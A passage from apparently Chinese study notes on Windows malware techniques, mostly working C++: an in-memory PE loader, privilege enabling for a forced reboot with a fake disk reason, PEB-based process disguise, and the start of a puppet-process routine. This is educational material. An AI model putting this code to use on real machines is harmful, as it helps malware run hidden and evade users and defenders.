lpBaseAddress,PBYTE pbuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER       pIDH = (PIMAGE_DOS_HEADER)pbuf;</span><br><span class="line">PIMAGE_FILE_HEADER      pIFH = (PIMAGE_FILE_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="number">4</span>);</span><br><span class="line">PIMAGE_OPTIONAL_HEADER  pIOH = (PIMAGE_OPTIONAL_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="number">0x18</span>);</span><br><span class="line">PIMAGE_SECTION_HEADER   pISH = (PIMAGE_SECTION_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="keyword">sizeof</span>(IMAGE_NT_HEADERS));</span><br><span class="line">DWORD dSectionNum = <span class="number">0</span>;</span><br><span class="line">HANDLE hProcess;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dSectionNum = pIFH-&gt;NumberOfSections;</span><br><span class="line"></span><br><span class="line">hProcess = GetCurrentProcess();</span><br><span class="line"><span class="comment">//写入头，头的映射无论是在内存还是在文件都是一样的。</span></span><br><span class="line"><span class="keyword">if</span> (WriteProcessMemory(hProcess, lpBaseAddress, pbuf, pIOH-&gt;SizeOfHeaders, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory Failed !!! %d&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//for循环写每个节区，BaseAddress + pISH-&gt;VirtualAddress代表每个节区在内存中的位置，pbuf + pISH-&gt;PointerToRawData代表在文件中的位置</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; dSectionNum; i++, pISH++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (WriteProcessMemory(hProcess, (LPVOID)((DWORD)lpBaseAddress + pISH-&gt;VirtualAddress), pbuf + pISH-&gt;PointerToRawData, pISH-&gt;SizeOfRawData, <span class="literal">NULL</span>) == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;WriteProcessMemory Failed !!!  %d&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">DoRelocationTable</span><span class="params">(LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER       pIDH = (PIMAGE_DOS_HEADER)lpBaseAddress;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER  pIOH = (PIMAGE_OPTIONAL_HEADER)((DWORD)lpBaseAddress + pIDH-&gt;e_lfanew + <span class="number">0x18</span>);</span><br><span class="line">PIMAGE_BASE_RELOCATION  PBR = (PIMAGE_BASE_RELOCATION)((DWORD)lpBaseAddress + pIOH-&gt;DataDirectory[<span class="number">5</span>].VirtualAddress);</span><br><span class="line"></span><br><span class="line">DWORD dwImageBase = pIOH-&gt;ImageBase;</span><br><span class="line"><span class="keyword">if</span> (pIOH-&gt;DataDirectory[<span class="number">5</span>].VirtualAddress == <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//没有重定位表</span></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (PBR-&gt;VirtualAddress != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">DWORD RvaofBlock = PBR-&gt;VirtualAddress;</span><br><span class="line"><span class="comment">//定义成一个WORD的指针，方便取值计算</span></span><br><span class="line">WORD* RvaArrays = (WORD*)((DWORD)PBR + <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION));</span><br><span class="line"><span class="comment">//算出这个重定位表块需要修改多少个RAV</span></span><br><span class="line"><span class="keyword">int</span> NumofRva = (PBR-&gt;SizeOfBlock - <span class="keyword">sizeof</span>(IMAGE_BASE_RELOCATION)) / <span class="keyword">sizeof</span>(WORD);</span><br><span class="line"></span><br><span class="line"><span class="comment">//修改每个块中的重定位表信息</span></span><br><span class="line"><span class="comment">//NumofRva-1是为了排除重定位表块最后的0000</span></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; NumofRva<span class="number">-1</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//32位程序一般Type就是3，也就是IMAGE_REL_BASED_HIGHLOW</span></span><br><span class="line">DWORD* pAddr = (DWORD*)((DWORD)lpBaseAddress +( RvaArrays[i] &amp; <span class="number">0xfff</span>) + RvaofBlock);</span><br><span class="line">*pAddr = *pAddr - dwImageBase + (DWORD)lpBaseAddress;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PBR = (PIMAGE_BASE_RELOCATION)((DWORD)PBR + PBR-&gt;SizeOfBlock);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">RepairIAT</span><span class="params">(LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER       pIDH = (PIMAGE_DOS_HEADER)lpBaseAddress;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER  pIOH = (PIMAGE_OPTIONAL_HEADER)((DWORD)lpBaseAddress + pIDH-&gt;e_lfanew + <span class="number">0x18</span>);</span><br><span class="line">PIMAGE_IMPORT_DESCRIPTOR PIID = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)lpBaseAddress + pIOH-&gt;DataDirectory[<span class="number">1</span>].VirtualAddress);</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* DllName = <span class="literal">NULL</span>;</span><br><span class="line">PIMAGE_IMPORT_BY_NAME FuctionName = <span class="literal">NULL</span>;</span><br><span class="line">HMODULE hDll = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (; *(DWORD *)PIID !=<span class="number">0</span>; PIID++)</span><br><span class="line">&#123;</span><br><span class="line">DllName = (<span class="keyword">char</span>*)((DWORD)lpBaseAddress + PIID-&gt;Name);</span><br><span class="line"><span class="comment">//hDll = GetModuleHandleA(DllName);</span></span><br><span class="line">hDll = LoadLibraryA(DllName);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PIMAGE_THUNK_DATA RVAofNameArrays = (PIMAGE_THUNK_DATA)((DWORD)lpBaseAddress + PIID-&gt;OriginalFirstThunk);</span><br><span class="line">PIMAGE_THUNK_DATA RVAofIatArrays = (PIMAGE_THUNK_DATA)((DWORD)lpBaseAddress + PIID-&gt;FirstThunk);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; RVAofIatArrays[i].u1.Function!=<span class="number">0</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">//前两个字节为Ordinal编号所以要加2</span></span><br><span class="line">FuctionName = (PIMAGE_IMPORT_BY_NAME)((DWORD)lpBaseAddress + RVAofNameArrays[i].u1.AddressOfData);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (RVAofNameArrays[i].u1.Ordinal&amp; <span class="number">0x80000000</span>)</span><br><span class="line">&#123;</span><br><span class="line">RVAofIatArrays[i].u1.Function = (DWORD)GetProcAddress(hDll, (LPCSTR)(RVAofNameArrays[i].u1.Ordinal &amp; <span class="number">0x0000FFFF</span>));</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">RVAofIatArrays[i].u1.Function = (DWORD)GetProcAddress(hDll, (LPCSTR)FuctionName-&gt;Name);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x  &quot;</span>, RVAofIatArrays[i].u1.Function);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%08x  &quot;</span>, RVAofNameArrays[i].u1.Ordinal);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%s  &quot;</span>, FuctionName-&gt;Name);</span><br><span class="line"><span class="comment">//GetProcAddress(hDll, FuctionName)</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">Set</span><span class="params">(LPVOID lpBaseAddress)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER       pIDH = (PIMAGE_DOS_HEADER)lpBaseAddress;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER  pIOH = (PIMAGE_OPTIONAL_HEADER)((DWORD)lpBaseAddress + pIDH-&gt;e_lfanew + <span class="number">0x18</span>);</span><br><span class="line">LPVOID lpExeEntry = (LPVOID)((DWORD)lpBaseAddress + pIOH-&gt;AddressOfEntryPoint);</span><br><span class="line"></span><br><span class="line">pIOH-&gt;ImageBase = (DWORD)lpBaseAddress;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__asm</span><br><span class="line">&#123;</span><br><span class="line">mov eax, lpExeEntry</span><br><span class="line">jmp eax</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">RunExe</span><span class="params">(PBYTE pbuf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">PIMAGE_DOS_HEADER       pIDH = (PIMAGE_DOS_HEADER)pbuf;</span><br><span class="line">PIMAGE_OPTIONAL_HEADER  pIOH = (PIMAGE_OPTIONAL_HEADER)(pbuf + pIDH-&gt;e_lfanew + <span class="number">0x18</span>);</span><br><span class="line">DWORD dImageSize = <span class="number">0</span>;</span><br><span class="line">LPVOID lpBaseAddress;</span><br><span class="line"></span><br><span class="line"><span class="comment">//申请ImageSize大小的内存空间</span></span><br><span class="line">dImageSize = pIOH-&gt;SizeOfImage;</span><br><span class="line">lpBaseAddress = VirtualAlloc(<span class="literal">NULL</span>, dImageSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">RtlZeroMemory(lpBaseAddress, dImageSize);</span><br><span class="line"></span><br><span class="line"><span class="comment">//向申请的空间写入目标exe的pe映像</span></span><br><span class="line"><span class="keyword">if</span> (ImageWrite(lpBaseAddress, pbuf) == FALSE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ImageWrite Failed!!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//重定位</span></span><br><span class="line">DoRelocationTable(lpBaseAddress);</span><br><span class="line"></span><br><span class="line">RepairIAT(lpBaseAddress);</span><br><span class="line"></span><br><span class="line">Set(lpBaseAddress);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">CHAR szExePath[MAX_PATH] = <span class="string">&quot;D:\\xor.exe&quot;</span>;</span><br><span class="line">PBYTE buf;</span><br><span class="line"></span><br><span class="line">ReadExeFile(szExePath,&amp;buf);</span><br><span class="line">RunExe(buf);</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行下，还是运行的PE映像切换的弹窗exe。<br><img src="https://s2.loli.net/2022/01/25/QFX5ubOrZE9dvTx.png"></p><h2 id="第六章-提权技术"><a href="#第六章-提权技术" class="headerlink" title="第六章-提权技术"></a>第六章-提权技术</h2><p>我们一般的用户就只有用户权限，在自删除技术中我们使用MoveFileEx，就只能利用管理员权限运行程序才能真正修改到注册表相应的位置，并且我们创建或者修改系统服务，修改HKEY_LOCL_MOCHINE注册表，ExitWindows关机的时候，都需要管理员权限，这也解决了当初我写MAZE病毒分析的时候，为什么仿写的关机部分没有成功的原因。也是为什么我们需要学习提权的原因。</p><h3 id="进程访问令牌权限提升"><a href="#进程访问令牌权限提升" class="headerlink" title="进程访问令牌权限提升"></a>进程访问令牌权限提升</h3><p>感觉都是套路操作了，也没讲原理。</p><p>Windows的常见权限<a href="https://docs.microsoft.com/zh-cn/windows/win32/secauthz/privilege-constants?redirectedfrom=MSDN">https://docs.microsoft.com/zh-cn/windows/win32/secauthz/privilege-constants?redirectedfrom=MSDN</a></p><p>下面代码申请了关机权限，实现了个关机程序</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">EnbalePrivileges</span><span class="params">(HANDLE hProcess, <span class="keyword">const</span> <span class="keyword">wchar_t</span>* pszPrivilegesName)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hToken = <span class="literal">NULL</span>;</span><br><span class="line">LUID luidValue = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">TOKEN_PRIVILEGES tokenPrivileges = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">BOOL bRet = FALSE;</span><br><span class="line">DWORD dwRet = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 打开进程令牌并获取具有 TOKEN_ADJUST_PRIVILEGES 权限的进程令牌句柄</span></span><br><span class="line">bRet = OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES, &amp;hToken);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;OpenProcessToken Failed!!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 获取本地系统的 pszPrivilegesName 特权的LUID值</span></span><br><span class="line">bRet = LookupPrivilegeValue(<span class="literal">NULL</span>, pszPrivilegesName, &amp;luidValue);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;LookupPrivilegeValue Failed!!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置提升权限信息</span></span><br><span class="line">tokenPrivileges.PrivilegeCount = <span class="number">1</span>; <span class="comment">//特权对应的数量</span></span><br><span class="line">tokenPrivileges.Privileges[<span class="number">0</span>].Luid = luidValue;</span><br><span class="line">tokenPrivileges.Privileges[<span class="number">0</span>].Attributes = SE_PRIVILEGE_ENABLED;<span class="comment">//启动该特权</span></span><br><span class="line"><span class="comment">// 提升进程令牌访问权限</span></span><br><span class="line">bRet = AdjustTokenPrivileges(hToken, FALSE, &amp;tokenPrivileges, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span> (FALSE == bRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;AdjustTokenPrivileges Failed!!!&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// 根据错误码判断是否特权都设置成功</span></span><br><span class="line">dwRet = GetLastError();</span><br><span class="line"><span class="keyword">if</span> (ERROR_SUCCESS == dwRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (ERROR_NOT_ALL_ASSIGNED == dwRet)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ERROR_NOT_ALL_ASSIGNED&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> FALSE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//获取关机权限</span></span><br><span class="line">EnbalePrivileges(GetCurrentProcess(), SE_SHUTDOWN_NAME);</span><br><span class="line"></span><br><span class="line"><span class="comment">//关机并重启，原因为磁盘原因</span></span><br><span class="line">ExitWindowsEx(EWX_REBOOT, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="第七章-隐藏技术"><a href="#第七章-隐藏技术" class="headerlink" title="第七章-隐藏技术"></a>第七章-隐藏技术</h2><h3 id="进程伪装"><a href="#进程伪装" class="headerlink" title="进程伪装"></a>进程伪装</h3><p>所谓进程伪装就是将进程的一些基本信息伪装成某些系统exe进程的信息，使其在任务管理器或者process monitor中看起来合理一点。</p><p>主要思路就是获取PEB结构体的地址，然后去修改PEB.processparameter这个结构体的内容。</p><p>我们来看看这个结构体的样子。</p><pre><code>typedef struct _RTL_USER_PROCESS_PARAMETERS &#123;  BYTE           Reserved1[16];  PVOID          Reserved2[10];  UNICODE_STRING ImagePathName;   //进程的图像文件的路径。  UNICODE_STRING CommandLine;     //传递给进程的命令行字符串。&#125; RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;</code></pre><p>我们要修改的就是ImagePathName，和ImagePathName。</p><p>但是这两个成员实际上也是UNICODE_STRING结构体。如下。</p><pre><code>typedef struct _UNICODE_STRING &#123;  USHORT Length;  USHORT MaximumLength;  PWSTR  Buffer;&#125; UNICODE_STRING, *PUNICODE_STRING;</code></pre><p>所以我们修改的是ImagePathName.Buffer和ImagePathName.Buffer，可以看到是宽字符，所以我们修改的时候，也要用宽字符。</p><p>如果是找自己进程的PEB地址的方法有很多种，在windows反调试文章中已经介绍过了。</p><p>而查找指定进程的PEB就需要用到书中的一个函数NtQueryInformationProcess，将其第二个参数设置为ProcessBasicInformation，时就能返回PROCESS_BASIC_INFORMATION结构体信息，里面存储了PebBaseAddress的地址。 </p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;winternl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//由于本函数没有专门的库，所以需要自己定义下。</span></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">NTSTATUS</span><span class="params">(WINAPI* NTQUERYINFORMATIONPROCESS)</span><span class="params">(</span></span></span><br><span class="line"><span class="function"><span class="params">HANDLE ProcessHandle,</span></span></span><br><span class="line"><span class="function"><span class="params">PROCESSINFOCLASS ProcessInformationClass,</span></span></span><br><span class="line"><span class="function"><span class="params">PVOID ProcessInformation,</span></span></span><br><span class="line"><span class="function"><span class="params">ULONG ProcessInformationLength,</span></span></span><br><span class="line"><span class="function"><span class="params">PULONG ReturnLength</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">DisguiseProcess</span><span class="params">(HANDLE hProcess, WCHAR* wcImagePathName, WCHAR* wcCommandLine)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">NTQUERYINFORMATIONPROCESS myNtQueryInformationProcess;</span><br><span class="line">PROCESS_BASIC_INFORMATION PBI;</span><br><span class="line">PEB peb;</span><br><span class="line">RTL_USER_PROCESS_PARAMETERS RUPP;</span><br><span class="line"><span class="keyword">int</span> CommandLinelenth;</span><br><span class="line"><span class="keyword">int</span> ImagePathNamelenth;</span><br><span class="line"></span><br><span class="line">myNtQueryInformationProcess = (NTQUERYINFORMATIONPROCESS)GetProcAddress(GetModuleHandle(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtQueryInformationProcess&quot;</span>);</span><br><span class="line">myNtQueryInformationProcess(hProcess, ProcessBasicInformation, &amp;PBI, <span class="keyword">sizeof</span>(PBI), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//获取PEB结构体</span></span><br><span class="line">peb = *(PBI.PebBaseAddress);</span><br><span class="line"><span class="comment">//获取RTL_USER_PROCESS_PARAMETERS结构体</span></span><br><span class="line">RUPP = *(peb.ProcessParameters);</span><br><span class="line"></span><br><span class="line"><span class="comment">//长度需要*2</span></span><br><span class="line">CommandLinelenth = <span class="number">2</span> + <span class="number">2</span> * wcslen(wcCommandLine);</span><br><span class="line">WriteProcessMemory(hProcess, RUPP.CommandLine.Buffer, wcCommandLine, CommandLinelenth, <span class="literal">NULL</span>);</span><br><span class="line">WriteProcessMemory(hProcess, &amp;RUPP.CommandLine.Length, &amp;CommandLinelenth, <span class="keyword">sizeof</span>(CommandLinelenth), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">ImagePathNamelenth = <span class="number">2</span> + <span class="number">2</span> * wcslen(wcImagePathName);</span><br><span class="line">WriteProcessMemory(hProcess, RUPP.ImagePathName.Buffer, wcImagePathName, ImagePathNamelenth, <span class="literal">NULL</span>);</span><br><span class="line">WriteProcessMemory(hProcess, &amp;RUPP.CommandLine.Length, &amp;ImagePathNamelenth, <span class="keyword">sizeof</span>(ImagePathNamelenth), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">HANDLE hProcess;</span><br><span class="line"></span><br><span class="line">WCHAR CommandLine[MAX_PATH] = <span class="string">L&quot;c:\\windows\\system32\\explore.exe&quot;</span>;</span><br><span class="line">WCHAR ImagePathName[MAX_PATH] = <span class="string">L&quot;c:\\windows\\system32\\explore.exe&quot;</span>;</span><br><span class="line"></span><br><span class="line">hProcess=GetCurrentProcess();</span><br><span class="line">DisguiseProcess(hProcess, ImagePathName, CommandLine);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的例子只能针对本进程，因为如果读取其他进程的PEB地址，用指针的方式会导致访问异常。如果想修改其他进程的话，必须用ReadProcessMemory来读取其他进程的PEB地址。</p><pre><code>// 获取指定进程进本信息结构中的PebBaseAddress::ReadProcessMemory(hProcess, pbi.PebBaseAddress, &amp;peb, sizeof(peb), NULL);// 获取指定进程环境块结构中的ProcessParameters, 注意指针指向的是指定进程空间中::ReadProcessMemory(hProcess, peb.ProcessParameters, &amp;Param, sizeof(Param), NULL);</code></pre><h3 id="傀儡进程-自我创建"><a href="#傀儡进程-自我创建" class="headerlink" title="傀儡进程-自我创建"></a>傀儡进程-自我创建</h3><p>书上的这种傀儡进程实际上就是自我创建，和《逆向工程核心原理》中55章内容差不多。实际上可以用来作为反调试的一种方式，但是很容易绕过。</p><p>下面的例子和书上实际上差不多，只是书上是用的shellcode，然后写入了父进程，并申请为可执行的空间。而我的例子只是把新ip变成了一个函数的地址。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">TRUEProc</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">MessageBoxA(<span class="number">0</span>, <span class="string">&quot;this is the true place&quot;</span>,<span class="string">&quot;The_Itach1&quot;</span>,MB_OK);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL <span class="title">CreateMyself</span><span class="params">(CHAR* szFilePath, PVOID ptr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">STARTUPINFOA si;</span><br><span class="line">PROCESS_INFORMATION pi;</span><br><span class="line">CONTEXT ctx = &#123; <span class="number">0</span> &#125;;</span><br><span class="line">ZeroMemory(&amp;pi, <span class="keyword">sizeof</span>(pi));<span class="comment">//用来将指定的内存块清零。</span></span><br><span class="line">ZeroMemory(&amp;si, <span class="keyword">sizeof</span>(si));</span><br><span class="line">si.cb = <span class="keyword">sizeof</span>(si);</span><br><span class="line"></span><br><span class="line">CreateProcessA(szFilePath, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, FALSE, CREATE_SUSPENDED, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;si, &amp;pi);</span><br><span class="line">ctx.ContextFlags = CONTEXT_FULL;</span><br><span 